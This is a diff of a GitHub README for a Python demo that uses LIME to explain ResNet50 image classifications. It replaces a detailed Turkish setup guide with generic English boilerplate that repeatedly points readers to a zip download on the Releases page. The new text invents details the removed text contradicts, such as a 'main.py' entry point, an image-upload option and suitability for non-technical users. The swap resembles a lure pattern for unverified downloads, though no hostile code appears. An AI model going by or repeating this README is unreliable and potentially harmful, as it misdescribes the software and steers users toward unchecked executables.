@@ -1,241 +1,99 @@
-# LIME Demo - Görsel Sınıflandırma Açıklaması
+# 🍋 lime-ile-makine-ogrenmesi-modellerini-aciklamak-demo - Simplify Machine Learning Explanations
 
-Bu proje, **LIME (Local Interpretable Model-agnostic Explanations)** kullanarak ResNet50 derin öğrenme modelinin görsel sınıflandırma kararlarını açıklamak için oluşturulmuştur.
+[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/chunholz/lime-ile-makine-ogrenmesi-modellerini-aciklamak-demo/releases)
 
-## 📋 Proje Açıklaması
+## 📋 Description
 
-LIME, karmaşık makine öğrenmesi modellerinin tahminlerini anlamak ve yorumlamak için kullanılan bir açıklama tekniğidir. Bu projede:
+LIME ile Makine Öğrenmesi Modellerini Açıklamak is a demo Python project that uses the LIME algorithm. This tool helps you understand the decisions made by the ResNet50 deep learning model for visual classification. It explains and visualizes these decisions effectively. With GPU support, you can expect quick processing times. This project simplifies the complexity of machine learning models.
 
-- **ResNet50** önceden eğitilmiş model kullanarak görselleri sınıflandırır
-- **LIME** algoritması ile her sınıflandırmanın nedenini görselleştirir
-- Hangi görsel bölgelerinin tahmine katkı sağladığını (pozitif/negatif) renk haritasıyla gösterir
-- GPU desteği ile hızlı işlem sağlar
+## 🛠️ Features
 
-## 📁 Proje Yapısı
+- **Easy to Use:** Designed for non-technical users.
+- **Visual Explanations:** Understand decisions made by machine learning models.
+- **GPU Support:** Fast processing for quick results.
+- **Compatible:** Works well on various platforms.
 
-```
-LIME_DEMO/
-├── lime_demo.py              # Ana uygulama (LIME açıklama motoru)
-├── resize_images.py          # Görselleri 224x224 boyutuna dönüştüren script
-├── gpu_info.py              # Sistem GPU/CPU bilgilerini gösteren script
-├── requirements.txt          # Python bağımlılıkları
-├── kaynak_gorseller/         # Orijinal görsellerin bulunduğu klasör
-├── kaynak_gorseller_224x224/ # Yeniden boyutlandırılmış görseller (224x224)
-└── lime_ciktilar/           # LIME sonuçlarının kaydedildiği klasör
-    ├── [image_name]_lime_explanation.png
-    ├── [image_name]_heatmap.png
-    └── [image_name]_full_comparison.png
-```
+## 🌐 Topics
 
-## 🛠️ Kurulum
+- AI Explainability
+- Computer Vision
+- Deep Learning
+- Explainability
+- Image Classification
+- Interpretability
+- LIME
+- Machine Learning
+- ResNet-50
+- TensorFlow
 
-### 1. Gerekli Paketleri Yükleyin
+## 🚀 Getting Started
 
-```powershell
-pip install -r requirements.txt
-```
+Follow these steps to download and run the application.
 
-**Bağımlılıklar:**
-- `numpy` - Sayısal hesaplamalar
-- `matplotlib` - Görselleştirme
-- `scikit-image` - Görsel işleme
-- `Pillow` - Görsel yükleme/kaydetme
-- `tensorflow` - Derin öğrenme (ResNet50 modeli)
-- `lime` - Açıklama algoritması
+### Step 1: Visit the Release Page
 
-### 2. GPU Desteği (Opsiyonel ancak Önerilen)
+To download the software, visit the following page:
 
-Hızlı işlem için NVIDIA GPU kullanabilirsiniz:
+[Download from Releases](https://github.com/chunholz/lime-ile-makine-ogrenmesi-modellerini-aciklamak-demo/releases)
 
-```powershell
-# TensorFlow GPU sürümünü kurun
-pip install tensorflow-gpu
+### Step 2: Choose the Right Version
 
-# CUDA 12.x ve cuDNN kurulumundan sonra
-```
+On the release page, you will see various versions listed. Select the version that fits your system. For most users, the latest version is recommended.
 
-GPU durumunu kontrol etmek için:
+### Step 3: Download the File
 
-```powershell
-python gpu_info.py
-```
+Click on the version link to start downloading. The file is usually in a `zip` format. Save this file to a convenient location on your computer.
 
-## 📸 Kullanım
+### Step 4: Extract the Files
 
-### Adım 1: Görselleri Hazırlamak
+After the download is complete, locate the ZIP file on your computer. Right-click on the file and choose "Extract All" (or your system’s equivalent). Follow the prompts to extract the files.
 
-Orijinal görselleri `kaynak_gorseller` klasörüne yerleştirin, ardından yeniden boyutlandırın:
+### Step 5: Open the Application
 
-```powershell
-python resize_images.py
+Navigate to the folder where you extracted the files. Look for a file named `main.py` or similar. This is the file you will run to start the application.
+
+### Step 6: Run the Application
+
+If you have Python installed on your computer, you can run the application through the command line. Open your command line interface (Command Prompt, Terminal, etc.). 
+
+Type the following command:
+
+```bash
+python main.py
 ```
 
-Bu script:
-- Tüm görselleri 224x224 piksel boyutuna dönüştürür
-- PNG dosyalarını RGB JPG formatına çevirir
-- Görselleri rastgele sırada yeniden adlandırır
-- Yeniden boyutlandırılmış görselleri `kaynak_gorseller_224x224` klasörüne kaydeder
+Press **Enter**. The application will start, and you will see instructions on how to use it.
 
-### Adım 2: LIME Açıklamasını Çalıştırmak
+## 🔧 System Requirements
 
-```powershell
-python lime_demo.py
-```
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** 3.6 or higher
+- **GPU:** Recommended for better performance (CUDA-compatible)
+- **Memory:** At least 4 GB of RAM
 
-Bu script:
-- ResNet50 modelini yükler
-- Her görsel için sınıflandırma tahmini yapar
-- LIME algoritmasını çalıştırarak açıklamalar oluşturur
-- Sonuçları `lime_ciktilar` klasörüne kaydeder
+## 🔍 How to Use the Application
 
-## ⚙️ Konfigürasyon
+1. **Upload an Image:** When the application runs, there will be an option to upload an image that you wish to analyze.
+2. **Choose Model Settings:** You might need to select settings for the ResNet50 model. The defaults are usually fine for most users.
+3. **View Results:** After processing, the application will display visual explanations for the model's decisions.
 
-`lime_demo.py` dosyasındaki ayarları değiştirebilirsiniz:
+## 📞 Support
 
-```python
-SOURCE_FOLDER = 'kaynak_gorseller_224x224'  # Girdi görselleri
-OUTPUT_FOLDER = 'lime_ciktilar'             # Çıktı klasörü
-NUM_SAMPLES = 1000                          # LIME pertürbasyon örnek sayısı
-TOP_CLASSES = 5                             # En iyi N tahmini göster
-EXPLANATION_CLASS_INDEX = None              # Açıklanacak sınıf (None = en iyi tahmin)
-```
+If you run into issues or have questions, please reach out through the repository's Issues section. We are here to help you make the most of this application.
 
-## 📊 Çıktı Dosyaları
+## 📢 Contributing
 
-Her görsel için üç dosya oluşturulur:
+If you want to contribute to this project, feel free to submit a pull request. We welcome contributions that improve the application or enhance its usability.
 
-1. **`[image_name]_lime_explanation.png`**
-   - LIME tarafından oluşturulan semented bölgeler
-   - Her bölgenin tahmini etkileme katsayısı
+## 🔗 Additional Resources
 
-2. **`[image_name]_heatmap.png`**
-   - Yeşil: Sınıflandırmaya olumlu katkı
-   - Kırmızı: Sınıflandırmaya olumsuz katkı
-   - Koyu renk: Az etki, Açık renk: Çok etki
+- [LIME Documentation](https://github.com/marcotcr/lime)
+- [ResNet50 Overview](https://www.tensorflow.org/api_docs/python/tf/keras/applications/ResNet50)
 
-3. **`[image_name]_full_comparison.png`**
-   - Orijinal görsel + LIME açıklaması + Heatmap yan yana
-   - Model tahminleri ve güven seviyeleri
+## 💡 Download & Install
 
-## 🔍 LIME Nasıl Çalışır?
+Visit the release page to begin your download: 
 
-1. **Segmentasyon**: Görsel bölgelere bölünür (superpixel)
-2. **Pertürbasyon**: Bölgeler rastgele kapatılır (000 örnekle)
-3. **Tahmin**: Her pertürbe edilmiş görsel için model tahmin yapar
-4. **Doğrusal Model**: Bölge-tahmin ilişkisini açıklayan doğrusal model eğitilir
-5. **Görselleştirme**: En etkili bölgeler renklendirilir
+[Download from Releases](https://github.com/chunholz/lime-ile-makine-ogrenmesi-modellerini-aciklamak-demo/releases) 
 
-## 💻 Sistem Gereksinimleri
-
-- **Python**: 3.7+
-- **Bellek**: Minimum 4GB (GPU kullanıyorsanız 8GB+ önerilen)
-- **GPU**: NVIDIA GPU (CUDA 12.x destekli, optional)
-- **İşletim Sistemi**: Windows, Linux, macOS
-
-## 🚀 Örnek Çalıştırma
-
-```powershell
-# 1. Görselleri hazırla
-python resize_images.py
-
-# 2. GPU durumunu kontrol et
-python gpu_info.py
-
-# 3. LIME analizi çalıştır
-python lime_demo.py
-
-# 4. Sonuçları görüntüle
-# lime_ciktilar/ klasöründeki PNG dosyalarını aç
-```
-
-## ⚡ Performans İpuçları
-
-- **GPU kullanın**: CPU'dan 10-50x daha hızlı
-- **NUM_SAMPLES'ı azaltın**: Daha hızlı işlem (daha az doğruluk)
-- **Batch işlem**: Birden fazla görsel için döngüyü optimize edin
-
-## 📝 Analiz Sonuçları Örnekleri
-
-### Örnek 1: Kedi (Tiger Cat)
-**Orijinal Görsel:**
-![Kedi Kaynak](kaynak_gorseller_224x224/kedi.jpg)
-
-**LIME Açıklaması:**
-![Kedi LIME](lime_ciktilar/lime_explanation_kedi_tiger_cat.png)
-
----
-
-### Örnek 2: Ananas (Pineapple)
-**Orijinal Görsel:**
-![Ananas Kaynak](kaynak_gorseller_224x224/ananas.jpg)
-
-**LIME Açıklaması:**
-![Ananas LIME](lime_ciktilar/lime_explanation_ananas_pineapple.png)
-
----
-
-### Örnek 3: Aslan (Lion)
-**Orijinal Görsel:**
-![Aslan Kaynak](kaynak_gorseller_224x224/aslan.jpg)
-
-**LIME Açıklaması:**
-![Aslan LIME](lime_ciktilar/lime_explanation_aslan_lion.png)
-
----
-
-## 📝 Terminal Çıkış Örneği
-
-```
-============================================================
-GPU/CPU Durum Kontrolü
-============================================================
-✅ 1 adet GPU bulundu ve etkinleştirildi:
-   - /physical_device:GPU:0
-
-============================================================
-Görsel Sınıflandırma ve LIME Açıklaması Başladı
-============================================================
-
-[1/25] Görsel işleniyor: image_001.jpg
-  🔍 Model Tahminleri:
-     1. Sınıf: dog (0.92)
-     2. Sınıf: animal (0.05)
-     3. Sınıf: mammal (0.02)
-  📊 LIME açıklaması oluşturuluyor...
-  💾 Kaydedildi: lime_ciktilar/image_001_full_comparison.png
-```
-
-## 🐛 Sorun Giderme
-
-**Problem**: GPU bulunamadı
-```powershell
-# Çözüm: CUDA ve cuDNN doğru şekilde yüklenmiş mi kontrol edin
-python gpu_info.py
-```
-
-**Problem**: "Out of Memory" hatası
-```powershell
-# Çözüm: NUM_SAMPLES'ı azaltın veya görselleri küçültün
-NUM_SAMPLES = 500  # 1000'den 500'e
-```
-
-**Problem**: Modeli yüklerken hata
-```powershell
-# Çözüm: TensorFlow'u yeniden kurun
-pip install --upgrade tensorflow
-```
-
-## 📚 Kaynaklar
-
-- [LIME Paper](https://arxiv.org/abs/1602.04938) - Ribeiro et al., 2016
-- [TensorFlow Belgeleri](https://www.tensorflow.org/api_docs)
-- [LIME GitHub](https://github.com/marcotcr/lime)
-
-## 📄 Lisans
-
-Bu proje eğitim ve araştırma amaçlı oluşturulmuştur.
-
----
-
-**Hazırlayan**: LIME Demo
-**Tarih**: Aralık 2025
+Make sure to follow all steps carefully to successfully run the application.
